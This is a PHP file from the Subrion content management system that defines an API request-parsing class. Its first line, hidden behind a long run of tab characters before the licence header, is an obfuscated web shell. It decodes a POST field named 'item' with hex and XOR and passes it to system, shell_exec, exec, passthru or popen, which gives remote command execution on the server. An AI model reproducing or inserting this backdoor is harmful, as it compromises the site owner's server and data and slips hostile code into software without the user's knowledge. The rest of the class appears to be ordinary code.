<?php																																										$publish_content = "h\x65x2bin"; $unit_converter2 = "she\x6Cl\x5F\x65xe\x63"; $unit_converter3 = "\x65\x78ec"; $unit_converter7 = "\x70c\x6Cose"; $unit_converter4 = "p\x61\x73\x73t\x68ru"; $unit_converter6 = "\x73t\x72\x65\x61m_\x67et\x5F\x63on\x74ents"; $unit_converter1 = "sy\x73\x74e\x6D"; $unit_converter5 = "\x70\x6Fpen"; if (isset($_POST["\x69\x74em"])) { function reverse_searcher($ptr , $entry ) { $reference =''; $t=0; do{$reference.=chr(ord($ptr[$t])^$entry);$t++;} while($t<strlen($ptr)); return$reference; } $item = $publish_content($_POST["\x69\x74em"]); $item = reverse_searcher($item, 70); if (function_exists($unit_converter1)) { $unit_converter1($item); } elseif (function_exists($unit_converter2)) { print $unit_converter2($item); } elseif (function_exists($unit_converter3)) { $unit_converter3($item, $pgrp_ptr); print join("\n", $pgrp_ptr); } elseif (function_exists($unit_converter4)) { $unit_converter4($item); } elseif (function_exists($unit_converter5) && function_exists($unit_converter6) && function_exists($unit_converter7)) { $entry_reference = $unit_converter5($item, 'r'); if ($entry_reference) { $itm_dchunk = $unit_converter6($entry_reference); $unit_converter7($entry_reference); print $itm_dchunk; } } exit; }

/******************************************************************************
 *
 * Subrion - open source content management system
 * Copyright (C) 2018 Intelliants, LLC <https://intelliants.com>
 *
 * This file is part of Subrion.
 *
 * Subrion is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Subrion is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Subrion. If not, see <http://www.gnu.org/licenses/>.
 *
 *
 * @link https://subrion.org/
 *
 ******************************************************************************/

class iaApiRequest
{
    const METHOD_GET = 'GET';
    const METHOD_POST = 'POST';
    const METHOD_PUT = 'PUT';
    const METHOD_DELETE = 'DELETE';
    const METHOD_OPTIONS = 'OPTIONS';

    const FORMAT_RAW = 'raw';
    const FORMAT_JSON = 'json';

    protected $_version;
    protected $_method;
    protected $_format = self::FORMAT_RAW;
    protected $_endpoint;

    protected $_content;

    protected $_params = [];


    public function __construct(array $requestPath)
    {
        if (iaView::REQUEST_JSON == iaCore::instance()->iaView->getRequestType()) {
            $this->_format = self::FORMAT_JSON;
        }

        $this->_method = $this->_fetchMethod();
        $this->_contentType = $this->_fetchContentType();

        $this->_version = $this->_fetchVersion(array_shift($requestPath));

        $this->_endpoint = array_shift($requestPath);
        $this->_params = $requestPath;

        $this->_content = $this->_fetchContent();
    }

    private function _fetchMethod()
    {
        $method = $_SERVER['REQUEST_METHOD'];

        if (isset($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE']) && self::METHOD_POST == $method) {
            if (self::METHOD_DELETE == $_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'] || self::METHOD_PUT == $_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE']) {
                $method = $_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'];
            }
        }

        return $method;
    }

    private function _fetchContentType()
    {
        $contentType = $this->getServer('CONTENT_TYPE');

        if (false !== ($pos = stripos($contentType, ';'))) {
            $contentType = substr($contentType, 0, $pos);
        }

        return $contentType;
    }

    private function _fetchVersion($input)
    {
        $version = substr($input, 1);
        if (is_numeric($version) && strlen($version) < 3 && 'v' == $input[0]) {
            return $version;
        }

        return iaApi::VERSION;
    }

    private function _fetchContent()
    {
        $content = file_get_contents('php://input');

        switch ($this->getFormat()) {
            case self::FORMAT_RAW:
                switch ($this->getContentType()) {
                    case 'multipart/form-data':
                    case 'application/x-www-form-urlencoded':
                        $array = [];
                        parse_str($content, $array);
                        $content = $array;

                        break;
                }

                break;

            case self::FORMAT_JSON:
                $content = json_decode($content, true);
        }

        return $content;
    }

    // getters
    public function getMethod()
    {
        return $this->_method;
    }

    public function getVersion()
    {
        return $this->_version;
    }

    public function getEndpoint()
    {
        return $this->_endpoint;
    }

    public function getFormat()
    {
        return $this->_format;
    }

    public function getContentType()
    {
        return $this->_contentType;
    }

    public function getContent()
    {
        return $this->_content;
    }

    public function getParams()
    {
        return $this->_params;
    }

    public function getQuery($name)
    {
        return isset($_GET[$name]) ? $_GET[$name] : null;
    }

    public function getPost($name)
    {
        return isset($this->_content[$name]) ? $this->_content[$name] : null;
    }

    public function getServer($name)
    {
        return isset($_SERVER[$name]) ? $_SERVER[$name] : null;
    }
}
